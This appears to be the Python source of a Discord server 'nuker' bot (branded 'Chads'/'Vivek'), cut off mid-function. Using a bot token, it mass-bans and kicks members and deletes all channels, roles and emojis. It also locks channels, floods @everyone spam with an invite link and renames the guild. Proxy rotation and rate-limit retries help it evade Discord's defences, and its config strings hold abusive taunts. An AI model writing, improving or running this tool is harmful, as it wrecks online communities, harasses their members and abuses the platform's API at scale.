import asyncio
import aiohttp
import discord
from discord.ext import commands
from itertools import cycle
import random
import json
import os
import webbrowser
import base64
from datetime import datetime, timedelta
import time
import pyperclip

VERSION = '2.1.4'

__mode__ = None


VIVEK_START = (180, 0, 255)    
VIVEK_END = (0, 255, 255)      
DESTROYER_START = (255, 20, 147)  
DESTROYER_END = (139, 0, 0)     
GREEN_START = (0, 255, 127)      
GREEN_END = (0, 128, 0)          
RED_START = (255, 0, 0)          
RED_END = (75, 0, 0)           
PINK_START = (255, 105, 180)     
PINK_END = (75, 0, 130)          

def gradient_text(text, start_color, end_color, bold=True):
    def rgb_to_256(r, g, b):
        r = round(r / 255 * 5)
        g = round(g / 255 * 5)
        b = round(b / 255 * 5)
        return 16 + (36 * r) + (6 * g) + b

    result = "\033[1m" if bold else ""
    length = len(text)
    for i, char in enumerate(text):
        ratio = i / max(length - 1, 1)
        r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
        color_code = rgb_to_256(r, g, b)
        result += f"\033[38;5;{color_code}m{char}"
    result += "\033[0m"
    return result

def get_mode_colors():
    if __mode__ == "destroyer":
        return DESTROYER_START, DESTROYER_END
    else:
        return VIVEK_START, VIVEK_END

def format_log_message(status, message, padding=50):
    grey = "\033[90m"
    reset = "\033[0m"
    
    timestamp = f"{grey}[{datetime.now():%Y-%m-%d %H:%M:%S}]{reset}"
    user_tag = f"{grey}~ Wizzed By Chads {reset}"
    
    mode_start, mode_end = get_mode_colors()
    
    if status == "SUCCESS":
        status_text = gradient_text("(+) SUCCESS", GREEN_START, GREEN_END, bold=True)
        msg_text = gradient_text(f"{message:<{padding}}", GREEN_START, GREEN_END, bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text}"
        
    elif status == "ERROR":
        status_text = gradient_text("(-) ERROR", RED_START, RED_END, bold=True)
        msg_text = gradient_text(f"{message:<{padding}}", RED_START, RED_END, bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text}"
        
    else:
        status_text = gradient_text("(~) INFO", mode_start, mode_end, bold=True)
        msg_text = gradient_text(f"{message:<{padding}}", mode_start, mode_end, bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text} »"

def switch_to_chads():
    global __mode__
    __mode__ = "Chads"
    os.system("cls") if os.name == "nt" else os.system("clear")
    print(format_log_message("SUCCESS", "Switched to Chads Mode", 40))
    print(format_log_message("INFO", "Chads On Top", 40))
    time.sleep(1.5)
    return True     

__intents__ = discord.Intents.default()
__intents__.members = True
__client__ = commands.Bot(command_prefix="+", help_command=None, intents=__intents__)

__config__ = None
__loaded_configs__ = {}  
__current_config_name__ = None  
__config_index__ = 0  
config_folder = "configs"

def switch_to_destroyer():
    global __mode__, __max_concurrent__
    __mode__ = "destroyer"
    __max_concurrent__ = 50
    os.system("cls") if os.name == "nt" else os.system("clear")
    print(format_log_message("SUCCESS", "Switched to Destroyer Mode", 40))
    print(format_log_message("INFO", "TIME TO DESTROY", 40))
    time.sleep(1.5)
    return True


def switch_config(config_name):
    global __config__, __current_config_name__, token, __max_concurrent__
    
    if config_name not in __loaded_configs__:
        print(format_log_message("ERROR", f"Config '{config_name}' not found!", 47))
        return False
    
    __current_config_name__ = config_name
    __config__ = __loaded_configs__[config_name].copy()
    token = __config__["token"]
    __max_concurrent__ = __config__.get("max_concurrent", 50)
    
    if os.name == "nt":
        os.system(f'title VIVEK ON TOP - Max Concurrent: {__max_concurrent__} - Config: {__current_config_name__}')
    
    return True

def load_multiple_configs():
    global __loaded_configs__, __current_config_name__, __config__, token, __max_concurrent__
    
    os.system("cls") if os.name == "nt" else os.system("clear")
    
    if not os.path.exists(config_folder):
        print(format_log_message("ERROR", "'configs' folder not found.", 50))
        os._exit(1)

    config_files = [f for f in os.listdir(config_folder) if f.endswith(".json")]
    if not config_files:
        print(format_log_message("ERROR", "No JSON files found in 'configs' folder.", 50))
        os._exit(1)
    while True:
        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Available Configs:", 50))
        print(gradient_text("╭" + "─" * 70 + "╮", mode_start, mode_end, bold=True))
        for i, config_file in enumerate(config_files, 1):
            print(gradient_text(f"│{i:<2} │ {config_file:<64} │", mode_start, mode_end, bold=True))
        print(gradient_text("╰" + "─" * 70 + "╯", mode_start, mode_end, bold=True))
        print(format_log_message("INFO", "Enter numbers (e.g., 1,2), ranges (1-3), filenames, or 'all'", 30))

        choice_input = input(format_log_message("INFO", "Choose config(s) to load", 50)).strip()
        if not choice_input:
            print(format_log_message("ERROR", "No input provided. Please enter config numbers or 'all'.", 45))
            continue

        choice_lower = choice_input.lower()
        indices = []
        invalid_tokens = []

        if choice_lower == 'all':
            indices = list(range(len(config_files)))
        else:
            tokens = [t.strip() for t in choice_input.split(',') if t.strip()]
            for tok in tokens:
                if '-' in tok and all(p.strip().isdigit() for p in tok.split('-', 1)):
                    try:
                        a_str, b_str = tok.split('-', 1)
                        a = int(a_str.strip()) - 1
                        b = int(b_str.strip()) - 1
                        if a <= b:
                            for idx in range(a, b + 1):
                                if 0 <= idx < len(config_files):
                                    indices.append(idx)
                                else:
                                    invalid_tokens.append(str(idx + 1))
                        else:
                            invalid_tokens.append(tok)
                    except Exception:
                        invalid_tokens.append(tok)
                elif tok.isdigit():
                    idx = int(tok) - 1
                    if 0 <= idx < len(config_files):
                        indices.append(idx)
                    else:
                        invalid_tokens.append(tok)
                else:
                    if tok in config_files:
                        indices.append(config_files.index(tok))
                    else:
                        invalid_tokens.append(tok)

        if invalid_tokens:
            print(format_log_message("ERROR", f"Invalid selections: {', '.join(invalid_tokens)}. Please try again.", 60))
            continue

        seen = set()
        final_indices = []
        for i in indices:
            if i not in seen and 0 <= i < len(config_files):
                final_indices.append(i)
                seen.add(i)

        if not final_indices:
            print(format_log_message("ERROR", "No valid configs selected. Please try again.", 50))
            continue

        for idx in final_indices:
            config_path = os.path.join(config_folder, config_files[idx])
            try:
                loaded_config = json.load(open(config_path, "r", encoding="utf-8"))
                __loaded_configs__[config_files[idx]] = loaded_config
                print(format_log_message("SUCCESS", f"Loaded {(config_files[idx])}", 52))
            except json.JSONDecodeError as e:
                print(format_log_message("ERROR", f"Invalid JSON in {config_files[idx]}: {str(e)}", 30))
            except Exception as e:
                print(format_log_message("ERROR", f"Error loading {config_files[idx]}: {str(e)}", 35))

        if not __loaded_configs__:
            print(format_log_message("ERROR", "No valid configs loaded! Please correct files and try again.", 43))
            continue

        __current_config_name__ = list(__loaded_configs__.keys())[0]
        __config__ = __loaded_configs__[__current_config_name__].copy()
        token = __config__["token"]
        __max_concurrent__ = __config__.get("max_concurrent", 50)
        print(format_log_message("SUCCESS", f"Active config: {(__current_config_name__)}", 45))
        time.sleep(1.5)
        break

os.system("cls") if os.name == "nt" else os.system("clear")

print(format_log_message("INFO", "Select Mode:", 50))
print(gradient_text("╭" + "─" * 60 + "╮", VIVEK_START, VIVEK_END, bold=True))
print(gradient_text("│ [1] Chads        - Standard Mode                         │", VIVEK_START, VIVEK_END, bold=True))
print(gradient_text("│ [2] Destroyer      - Extreme Mode                          │", DESTROYER_START, DESTROYER_END, bold=True))
print(gradient_text("╰" + "─" * 60 + "╯", DESTROYER_START, DESTROYER_END, bold=True))

mode_choice = input(format_log_message("INFO", "Choose mode (1-2)", 50)).strip().lower()

if mode_choice == "2":
    __mode__ = "destroyer"
    __max_concurrent__ =  100
    print(format_log_message("SUCCESS", "Destroyer Mode Activated", 40))
else:
    __mode__ = "Chads"
    print(format_log_message("SUCCESS", "Chads Mode Activated", 40))
    time.sleep(1.8)

os.system("cls") if os.name == "nt" else os.system("clear")

try:
    print(format_log_message("INFO", "Load config file or manual input? [c/m]", 50), end=" ")
    config_choice = input().strip().lower()
    
    if config_choice == 'm':
        token = input(format_log_message("INFO", "Enter bot token", 50)).strip()
        if not token:
            print(format_log_message("ERROR", "Token is required!", 47))
            os._exit(1)
        max_concurrent = input(format_log_message("INFO", "Enter max concurrent tasks (default 200)", 50)).strip()
        max_concurrent = int(max_concurrent) if max_concurrent.isdigit() else 200
        use_proxy = input(format_log_message("INFO", "Use proxies? [y/n]", 50)).strip().lower() == 'y'
        __config__ = {
            "token": token,
            "max_concurrent": max_concurrent,
            "proxy": use_proxy,
            "nuke": {
                "channel_names": ["nuked by Chads", "wizzed by Chads", "fucked by Chads"],
                "roles_name": ["stfu Chads run you", "Chads owns you", "Chads fucked your ass"],
                "messages_content": ["@everyone @here Nuked by Chads join https://discord.gg/hawty", "@everyone @here Chads wizzed you join https://discord.gg/hawty", "@everyone @here destroyed by Chads join https://discord.gg/hawty"],
                "delete_all_channels": True
            },
            "nuke_all": {
                "ban_members": True,
                "delete_channels": True,
                "delete_roles": True,
                "delete_emojis": True,
                "change_guild_name": True,
                "create_channels": True,
                "create_roles": True,
                "spam_webhooks": True
            },
            "operations": {
                "ban_reason": "Nuked by Chads",
                "nick_users_to": "Wizzed by Chads",
                "dm_message": "@everyone Chads wizzed This Server! join discord.gg/hawty",
                "spam_message": "@everyone @here Wizzed by Chads join discord.gg/hawty",
                "guild_name": "Wizzed By Chads",
                "guild_icon": "",
                "channel_type": 0,
                "enable_auto_admin": True,            
                "webhooks": {
                    "name": "Chads op",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1553695974399021089/1553698565971382313/images.jpg?ex=6aba320c&is=6ab8e08c&hm=e98432e45c1a6db8b065e3c348a5ec83850de15d8e9e1233cd84edb4cac91c99",
                    "messages": [
                        "@everyone @here Chads x Vivek wizzed your ass Chads on top https://discord.gg/hawty",
                        "@everyone @here Chads x Vivek owns you all Chads on top https://discord.gg/hawty",
                        "@everyone @here Chads x Vivek fucked you all Chads on top https://discord.gg/hwaty"
                    ]
                },
                "emoji_rename_to": "Wizzed by Chads",
            }
        }
        __loaded_configs__["manual"] = __config__.copy()
        __current_config_name__ = "manual"
        __max_concurrent__ = max_concurrent
        print(format_log_message("SUCCESS", "Manual configuration loaded", 33))

        os.system("cls") if os.name == "nt" else os.system("clear")
    else:
        load_multiple_configs()
        os.system("cls") if os.name == "nt" else os.system("clear")
except KeyboardInterrupt:
    os.system("cls") if os.name == "nt" else os.system("clear")
    print(format_log_message("INFO", "Closing Nuker... Goodbye!", 40))
    exit(0)

token = __config__["token"]
__max_concurrent__ = __config__.get("max_concurrent", 50)

os.system("cls") if os.name == "nt" else os.system("clear")

console_width = 140

class Chads:
    def __init__(self, guildid, client):
        self.guildid = guildid
        self.guild = None
        self.client = client
        self.has_proxies = False
        self.proxy_count = 0
        try:
            with open("proxies.txt", "r") as f:
                proxy_list = f.read().splitlines()
            if not proxy_list:
                print(format_log_message("ERROR", "proxies.txt is empty. Disabling proxies.", 28))
            else:
                valid_proxies = []
                for proxy in proxy_list:
                    proxy = proxy.strip()
                    if proxy and ":" in proxy:
                        host, port = proxy.rsplit(":", 1)
                        if port.isdigit():
                            valid_proxies.append(proxy)
                        else:
                            print(format_log_message("ERROR", f"Invalid proxy port in '{proxy}'. Skipping.", 19))
                    else:
                        print(format_log_message("ERROR", f"Invalid proxy format: '{proxy}'. Skipping.", 16))
                if not valid_proxies:
                    print(format_log_message("ERROR", "No valid proxies found. Disabling proxies.", 23))
                else:
                    self.proxy_cycle = cycle(valid_proxies)
                    self.has_proxies = True
                    self.proxy_count = len(valid_proxies)
                    print(format_log_message("SUCCESS", f"Loaded {len(valid_proxies)} valid proxies for rotation.", 17))
        except FileNotFoundError:
            print(format_log_message("ERROR", "proxies.txt not found. Disabling proxies.", 24))
        except Exception as e:
            print(format_log_message("ERROR", f"Error reading proxies: {str(e)}", 15))
            time.sleep(2)
        
        self.version = cycle(['v9', 'v10'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.semaphore = asyncio.Semaphore(__max_concurrent__)
        self.session = None 
        self.token =__config__["token"]
        self.concurrent = __max_concurrent__
        self.whitelist_file = "configs/whitelist.txt"
        self.whitelist = self._load_whitelist()
        self.auto_admin_enabled = False
        print(format_log_message("SUCCESS", f"Loaded {(str(len(self.whitelist)))} whitelisted members.", 22))
        time.sleep(1.5)

    def _load_whitelist(self):
        try:
            if not os.path.exists(self.whitelist_file):
                return set()
            with open(self.whitelist_file, "r") as f:
                return set(line.strip() for line in f if line.strip() and line.strip().isdigit())
        except Exception:
            return set()

    def _save_whitelist(self):
        try:
            os.makedirs(os.path.dirname(self.whitelist_file) or 'configs', exist_ok=True)
            with open(self.whitelist_file, "w") as f:
                f.write('\n'.join(sorted(list(self.whitelist))))
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to save whitelist: {e}", 36))

    async def add_to_whitelist(self, user_id):
        user_id = user_id.strip()
        if not user_id.isdigit():
            print(format_log_message("ERROR", f"Invalid User ID: {user_id}", 40))
            return False
        if user_id in self.whitelist:
            print(format_log_message("INFO", f"User {user_id} already whitelisted", 40))
            return False
        self.whitelist.add(user_id)
        self._save_whitelist()
        print(format_log_message("SUCCESS", f"Whitelisted User ID: {user_id}", 40))
        return True

    async def remove_from_whitelist(self, user_id):
        user_id = user_id.strip()
        if user_id in self.whitelist:
            self.whitelist.remove(user_id)
            self._save_whitelist()
            print(format_log_message("SUCCESS", f"Removed User ID: {user_id} from whitelist", 35))
            return True
        print(format_log_message("ERROR", f"User {user_id} not found in whitelist", 40))
        return False

    async def async_input(self, prompt: str):
        try:
            user_input = await self.client.loop.run_in_executor(None, lambda: input(prompt))
            if user_input.lower().strip() in ['d','dd','ddd', 'dddd', 'ddddd', 'dddddd', 'd' * 7]:
                if __mode__ == "Chads":
                    switch_to_destroyer()
                else:
                    switch_to_chads()
                return "MODE_SWITCHED"
            time.sleep(0.7)
            return user_input
        except KeyboardInterrupt:
            os.system("cls") if os.name == "nt" else os.system("clear")
            print(format_log_message("INFO", "Closing Nuker... Goodbye!", 40))
            exit(0)

    async def _get_session(self):
        if self.session is None or self.session.closed:
            headers = {"Authorization": f"Bot {self.token}"}
            if __mode__ == "destroyer":
                self.session = aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(limit=0, ssl=False, force_close=False),
                    timeout=aiohttp.ClientTimeout(total=5),
                    headers=headers
                )
            else:
                self.session = aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(limit=100, ssl=False, force_close=False),
                    timeout=aiohttp.ClientTimeout(total=7),
                    headers=headers
                )
        return self.session

    def _get_proxy(self):
        if __config__.get("proxy") and self.has_proxies:
            proxy_host = next(self.proxy_cycle)
            return f"http://{proxy_host}"
        return None

    async def execute_ban(self, member: str, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Ban)", 41))
            return True

        async with self.semaphore:

            ban_reason = __config__.get("ban_reason", "Nuked by Chads")
            payload = {"delete_message_days": random.randint(0, 7), "audit_log_reason": ban_reason}
            try:
                session = await self._get_session()
                async with session.put(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{member}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status in [200, 201, 204]:
                            print(format_log_message("SUCCESS", f"Banned {member}", 52))
                            self.banned.append(member)
                            return True
                        elif response.status == 429:
                            return await self.execute_ban(member, token)
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 41))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        elif "Max number of bans" in await response.text():
                            print(format_log_message("ERROR", "Max bans exceeded", 47))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to ban {member}", 46))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to ban {member} | {e}", 46))
                return False

    async def execute_kick(self, member: str, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Kick)", 41))
            return True

        async with self.semaphore:

            try:
                session = await self._get_session()
                async with session.delete(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as response:
                        if response.status in [200, 201, 204]:
                            print(format_log_message("SUCCESS", f"Kicked {member}", 52))
                            self.kicked.append(member)
                            return True
                        elif response.status == 429:
                            return await self.execute_kick(member, token)
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 41))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to kick {member}", 46))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to kick {member} | {e}", 46))
                return False

    async def execute_prune(self, days: int, token: str):
        async with self.semaphore:
            try:
                session = await self._get_session()
                payload = {"days": days}
                async with session.post(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/prune",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            pruned = (await response.json()).get('pruned', 0)
                            print(format_log_message("SUCCESS", f"Pruned {pruned} members", 43))
                            return pruned
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", "Missing Permissions for pruning", 35))
                        elif response.status == 429:
                            pass
                        elif "Max number of prune" in await response.text():
                            print(format_log_message("ERROR", "Max prune reached", 46))
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                        else:
                            print(format_log_message("ERROR", "Failed to prune members", 41))
                        return 0
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to prune members | {e}", 41))
                return 0

    async def execute_crechannels(self, channelsname: str, type_: int, token: str):
        async with self.semaphore:
            payload = {"type": type_, "name": channelsname.replace(" ", "-"), "permission_overwrites": []}
            try:
                session = await self._get_session()
                async with session.post(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 201:
                            channel_id = (await response.json())['id']
                            print(format_log_message("SUCCESS", f"Created channel ID {channel_id}", 42))
                            self.channels.append(1)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for #{payload['name']}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to create #{payload['name']}", 40))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to create #{payload['name']} | {e}", 40))
                return False

    async def execute_creroles(self, rolesname: str, token: str):
        async with self.semaphore:
            colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
            payload = {"name": rolesname, "color": colors}
            try:
                session = await self._get_session()
                async with session.post(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            role_id = (await response.json())['id']
                            print(format_log_message("SUCCESS", f"Created role ID {role_id}", 45))
                            self.roles.append(1)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for @{rolesname}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to create @{rolesname}", 40))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to create @{rolesname} | {e}", 40))
                return False

    async def execute_delchannels(self, channel: str, token: str):
        async with self.semaphore:

            try:
                session = await self._get_session()
                async with session.delete(
                    f"https://discord.com/api/{next(self.version)}/channels/{channel}",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            print(format_log_message("SUCCESS", f"Deleted channel {channel}", 42))
                            self.channels.append(channel)
                            return True
                        elif response.status == 429:
                            return await self.execute_delchannels(channel, token)
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {channel}", 35))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to delete {channel}", 44))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to delete {channel} | {e}", 44))
                return False

    async def execute_lock_all_channels(self, token: str):
        try:
            session = await self._get_session()
            async with session.get(
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels",
                headers={"Authorization": f"Bot {token}"},
                proxy=self._get_proxy()
            ) as response:
                if response.status == 200:
                    channels = await response.json()
                    tasks = []
                    for channel in channels:
                        if channel['type'] in [0, 5]:
                            task = self._lock_channel(session, token, channel)
                            tasks.append(task)
                    await asyncio.gather(*tasks, return_exceptions=True)
                    return True
                else:
                    print(format_log_message("ERROR", "Failed to fetch channels", 45))
                    return False
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to lock channels | {e}", 44))
            return False

    async def _lock_channel(self, session, token: str, channel):
        try:
            payload = {
                "permission_overwrites": [
                    {
                        "id": self.guildid,
                        "type": "role",
                        "allow": "0",
                        "deny": "66560"
                    }
                ]
            }
            async with session.patch(
                f"https://discord.com/api/{next(self.version)}/channels/{channel['id']}",
                headers={"Authorization": f"Bot {token}"},
                json=payload,
                proxy=self._get_proxy(),
            ) as patch_response:
                if patch_response.status == 200:
                    print(format_log_message("SUCCESS", f"Locked channel {channel['name']}", 45))
                else:
                    print(format_log_message("ERROR", f"Failed to lock {channel['name']}", 45))
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to lock {channel['name']} | {e}", 45))

    async def execute_unlock_all_channels(self, token: str):
        try:
            session = await self._get_session()
            async with session.get(
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels",
                headers={"Authorization": f"Bot {token}"},
                proxy=self._get_proxy()
            ) as response:
                if response.status == 200:
                    channels = await response.json()
                    tasks = []
                    for channel in channels:
                        if channel['type'] in [0, 5]:
                            task = self._unlock_channel(session, token, channel)
                            tasks.append(task)
                    await asyncio.gather(*tasks, return_exceptions=True)
                    return True
                else:
                    print(format_log_message("ERROR", "Failed to fetch channels", 45))
                    return False
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to unlock channels | {e}", 44))
            return False

    async def _unlock_channel(self, session, token: str, channel):
        try:
            payload = {
                "permission_overwrites": [
                    {
                        "id": self.guildid,
                        "type": "role",
                        "allow": "66560",
                        "deny": "0"
                    }
                ]
            }
            async with session.patch(
                f"https://discord.com/api/{next(self.version)}/channels/{channel['id']}",
                headers={"Authorization": f"Bot {token}"},
                json=payload,
                proxy=self._get_proxy(),
            ) as patch_response:
                if patch_response.status == 200:
                    print(format_log_message("SUCCESS", f"Unlocked channel {channel['name']}", 45))
                else:
                    print(format_log_message("ERROR", f"Failed to unlock {channel['name']}", 45))
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to unlock {channel['name']} | {e}", 45))

    
    async def execute_delroles(self, role_id: str, token: str, retry_count: int = 0) -> bool:
        should_retry = False
        wait_time = 0
        async with self.semaphore:
            try:
                session = await self._get_session()
                async with session.delete(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles/{role_id}",
                    headers={"Authorization": f"Bot {token}"},
                    proxy=self._get_proxy(),
                    timeout=aiohttp.ClientTimeout(total=6)
                ) as resp:
                    if resp.status in (200, 204):
                        print(format_log_message("SUCCESS", f"Deleted role {role_id}", 45))
                        return True
                    elif resp.status == 429:
                        retry_count += 1
                        incremental_delay = retry_count * 0.5
                        try:
                            retry_data = await resp.json()
                            discord_delay = retry_data.get('retry_after', 0)
                            wait_time = max(incremental_delay, discord_delay) + random.uniform(0.1, 0.3)
                        except Exception:
                            wait_time = incremental_delay + random.uniform(0.1, 0.3)
                        print(format_log_message("ERROR", f"Rate Limited! Delaying {wait_time:.2f}s for role {role_id} (Attempt {retry_count})", 40))
                        should_retry = True
                    elif resp.status == 403:
                        text = await resp.text()
                        if "Missing Permissions" in text:
                            print(format_log_message("ERROR", f"Missing perms to delete role {role_id}", 42))
                        elif "You are being blocked" in text:
                            print(format_log_message("ERROR", "API block detected – Pausing all Operations", 38))
                            await asyncio.sleep(15)
                        return False
                    else:
                        print(format_log_message("ERROR", f"Failed role delete {role_id} ({resp.status})", 40))
                        return False
            except Exception as e:
                print(format_log_message("ERROR", f"Exception deleting role {role_id}: {e}", 38))
                return False
        if should_retry:
            await asyncio.sleep(wait_time)
            return await self.execute_delroles(role_id, token, retry_count)
        return False

    async def execute_delroles_all(self, token: str, skip_everyone: bool = True):
        try:
            session = await self._get_session()
            async with session.get(
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                headers={"Authorization": f"Bot {token}"},
                proxy=self._get_proxy()
            ) as resp:
                if resp.status != 200:
                    print(format_log_message("ERROR", f"Failed to fetch roles ({resp.status})", 42))
                    return 0
                roles = await resp.json()
                if not roles:
                    print(format_log_message("INFO", "No roles found to delete.", 38))
                    return 0
                roles_to_delete = [
                    role['id'] for role in roles if not (skip_everyone and role['id'] == self.guildid)
                ]
                if not roles_to_delete:
                    print(format_log_message("INFO", "No deletable roles found.", 38))
                    return 0
                print(format_log_message("INFO", f"Starting deletion of {len(roles_to_delete)} roles...", 48))
                start_time = time.time()
                tasks = [self.execute_delroles(rid, token) for rid in roles_to_delete]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success = sum(1 for r in results if r is True)
                duration = time.time() - start_time
                print(format_log_message("SUCCESS", f"Deleted {success}/{len(roles_to_delete)} roles in {duration:.2f}s", 45))
                return success
        except Exception as e:
            print(format_log_message("ERROR", f"Mass role deletion failed: {e}", 40))
            return 0
        
    async def execute_delemojis(self, emoji_id: str, token: str) -> bool:
        async with self.semaphore:
            try:
                session = await self._get_session()
                async with session.delete(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/emojis/{emoji_id}",
                    headers={"Authorization": f"Bot {token}"},
                    proxy=self._get_proxy(),
                    timeout=aiohttp.ClientTimeout(total=7)
                ) as resp:
                    if resp.status in (200, 204):
                        print(format_log_message("SUCCESS", f"Deleted emoji {emoji_id}", 45))
                        return True
                    elif resp.status == 429:
                        try:
                            retry_after = (await resp.json()).get('retry_after', 0.8)
                        except Exception:
                            retry_after = 0.8
                        await asyncio.sleep(retry_after + random.uniform(0.05, 0.4))
                        return await self.execute_delemojis(emoji_id, token)
                    elif resp.status == 403:
                        if "Missing Permissions" in await resp.text():
                            print(format_log_message("ERROR", f"No permission to delete emoji {emoji_id}", 40))
                        return False
                    else:
                        print(format_log_message("ERROR", f"Failed to delete emoji {emoji_id} ({resp.status})", 42))
                        return False
            except Exception as e:
                print(format_log_message("ERROR", f"Emoji delete error {emoji_id}: {e}", 38))
                return False


    async def execute_delemojis_all(self, token: str) -> int:
        try:
            session = await self._get_session()
            async with session.get(
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/emojis",
                headers={"Authorization": f"Bot {token}"},
                proxy=self._get_proxy()
            ) as resp:
                if resp.status != 200:
                    print(format_log_message("ERROR", "Failed to fetch emojis", 38))
                    return 0
                emojis = await resp.json()

            if not emojis:
                print(format_log_message("INFO", "No emojis to delete.", 35))
                return 0

            print(format_log_message("INFO", f"Deleting {len(emojis)} emojis at max speed...", 45))
            start = time.time()

            tasks = [self.execute_delemojis(emoji['id'], token) for emoji in emojis]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            success = sum(1 for r in results if r is True)
            duration = time.time() - start

            print(format_log_message("SUCCESS", f"Deleted {success}/{len(emojis)} emojis in {duration:.2f}s", 44))
            return success

        except Exception as e:
            print(format_log_message("ERROR", f"Mass emoji deletion failed: {e}", 38))
            return 0

    

    async def execute_massping(self, channel: str, content: str, token: str):
        async with self.semaphore:
            if not content:
                content = __config__.get("operations", {}).get("spam_message", "@everyone @here Server nuked by Chads!")
            payload = {"content": content}
            try:
                session = await self._get_session()
                async with session.post(
                    f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            print(format_log_message("SUCCESS", f"Spammed in {channel}", 47))
                            self.messages.append(channel)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {channel}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to spam in {channel}", 42))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to spam in {channel} | {e}", 42))
                return False
            
    async def execute_nick_all_fast(self, token: str, new_nick: str = None):
        if not new_nick:
            new_nick = __config__.get("operations", {}).get("nick_users_to", "Wizzed by Chads")

        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip() and line.strip().isdigit()]
        except:
            print(format_log_message("ERROR", "members.txt missing or empty", 40))
            return 0

        members = [m for m in members if m not in self.whitelist]
        total = len(members)

        if total == 0:
            print(format_log_message("INFO", "No members to nickname after whitelist filter", 45))
            return 0

        print(format_log_message("INFO", f"Starting nick-all → \"{new_nick}\"  ({total} targets)", 50))

        success_count = 0

        async def nick_one(member_id: str):
            nonlocal success_count
